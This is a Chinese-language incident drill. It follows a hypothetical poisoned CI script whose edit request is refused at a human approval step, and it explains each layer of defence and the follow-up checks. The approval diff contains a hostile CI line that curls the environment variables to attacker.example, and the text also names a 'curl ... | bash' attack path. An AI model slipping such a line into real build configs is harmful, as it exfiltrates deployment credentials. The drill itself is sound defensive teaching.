# 事故演练：一次被拒绝的高危提权尝试

一次假设的安全事件，走一遍从"发现异常"到"止血"到"复盘"的完整流程。目的不是演示"系统被攻破了",而是演示"系统的分层防御在预期之内挡住了一次真实的越权尝试",以及运维人员应该怎么读懂日志、确认没有更大范围的影响。

## 0. 场景设定

`propose-edit` 这条命令行链路被部署给一个内部工具,允许一个自动化脚本（比如 CI 里的"自动修 lint"任务）对代码库发起编辑提案,权限预设配置成 `balanced`（只读工具自动放行,写操作走人工审批）。

某天,这个自动化脚本因为一个上游依赖被投毒（supply chain 场景,不是这个项目的攻击者,只是触发场景的前提）,开始尝试对 `.github/workflows/ci.yml` 发起编辑——目标是往 CI 配置里加一行,让 CI 在构建时把仓库里的环境变量（可能包含部署凭据）发送到一个外部地址。

## 1. 发现（Detection）

值班人员看到审批队列里出现一条不寻常的请求：

```
--- approval requested: edit_file ".github/workflows/ci.yml" (expires in 300s) ---
-      - run: pnpm build
+      - run: pnpm build && curl -X POST https://attacker.example/exfil -d "$(env)"
approve? [y/N]
```

**这一步依赖的机制**：`ApprovalRequest.argsSummary`（Day19）把 diff 的前 200 个字符原样带到了审批界面——如果没有这个字段,人工审批环节只能看到一句"要不要批准这次 edit_file",完全看不出改动内容,值班人员没有任何依据可以判断可疑与否。这是审批机制"绑定具体参数,而不是一句含糊的继续"这条设计原则在真实场景下的价值。

## 2. 止血（Containment）

值班人员直接在提示符回答 `n`（拒绝）。

**验证止血生效**：
- `proposeEdit()` 返回 `{ kind: 'denied', ... }`（`src/propose-edit.ts`），`.github/workflows/ci.yml` 文件内容**没有任何字节被改动**——`tests/propose-edit.test.ts:57` 这条回归测试专门覆盖了"拒绝之后文件保持原样"这个断言,这次事件走的正是这条代码路径。
- 这个 nonce 从未被 `approvalStore.consume()`,不会有任何"看起来像是批准过的"审计记录——一次拒绝在审计日志里就应该清楚地是一次拒绝,不能被误读成"批准了但没生效"。

如果值班人员误按了 `y`：`edit_file` 会真的把这一行写进 `ci.yml`（`expectedHash` 校验只防"文件被别人动过",不防"审批人自己批准了一个恶意改动"——审批机制挡的是"未经批准的动作",挡不住"审批人本身做出了错误判断",这是人机协作类系统一个诚实的局限,不是这个项目能靠代码解决的问题）。

## 3. 复盘（Post-mortem）

**根因**：自动化脚本本身被上游依赖投毒,不是 `propose-edit` 链路的漏洞——`propose-edit` 起到的作用是"即使调用方已经被攻陷,写入动作依然必须经过一次人工审批,不会自动生效"。

**这次事件里,分层防御的每一层各自起到了什么作用**：

| 层 | 如果这一层不存在,会发生什么 |
|---|---|
| `permission-presets`（Day19）配置成 `balanced` 而不是 `autonomous` | 如果配置成 `autonomous`,`preset.decide('edit_file')` 会返回 `auto-approve`,`proposeEdit()` 根本不会调用 `requestApproval()`,这次恶意编辑会**直接生效**,值班人员完全没有介入的机会——见 `src/propose-edit.ts` 里 `decision === 'auto-approve'` 那个分支。 |
| `ApprovalRequest.argsSummary` 把 diff 内容带到审批界面 | 如果只展示"是否批准 edit_file",值班人员没有信息可以判断,大概率会习惯性按 `y`（审批疲劳,security fatigue 是真实存在的现象）。 |
| `edit_file` 的 `expectedHash` 乐观并发控制（Day15） | 挡的是另一类问题（并发改写）,这次事件里不起作用——如果只依赖这一层,拦不住一次"参数本身就是恶意的"合法审批流程。 |
| `CommandPolicy`（Day18） | 这次事件是编辑文件,不是执行命令,`CommandPolicy` 不在这次事件的防线之内——如果攻击者换一个路径,直接诱导脚本调用 `run_command` 执行 `curl ... | bash`,`CommandPolicy` 的白名单会是下一道防线。 |

**改进项（不在今天代码范围内,留给读者的思考/exercise 方向）**：
- 给 `.github/`、`*.yml` 这类高敏感路径单独配置更严格的预设（比如"只有这些路径下的编辑,无论 preset 是什么,一律走人工审批"）,而不是让一个全局 preset 决定所有文件的审批策略——这需要 `PermissionPreset.decide()` 从只吃 `toolName` 扩展成也能感知具体调用参数（比如目标路径）,今天的 `permission-presets.ts` 还不支持这一点。
- 给审批界面加一个"这次改动涉及的文件路径是否匹配一份已知敏感路径列表"的高亮提示,降低"审批疲劳"导致的误判概率。

## 4. 事后检查清单

- [ ] 确认 `.github/workflows/ci.yml` 内容确实与拒绝前一致（`git status`/`git diff` 应该干净）。
- [ ] 确认这次拒绝在 `ApprovalStore` 里没有被后续任何调用消费（今天的 `ApprovalStore` 是纯内存实现,没有持久化审计日志——如果要支持"事后审计",需要给每次 `create()`/`consume()` 调用接一个真正的日志 sink,这也是留给 `mergeSettings`/Session 事件体系将来整合的方向,今天没有做）。
- [ ] 排查触发这次异常编辑请求的自动化脚本本身,而不只是停在"这次审批被拒绝了就没事了"——`propose-edit` 挡住的是这一次的写入动作,没有清除攻陷源头。
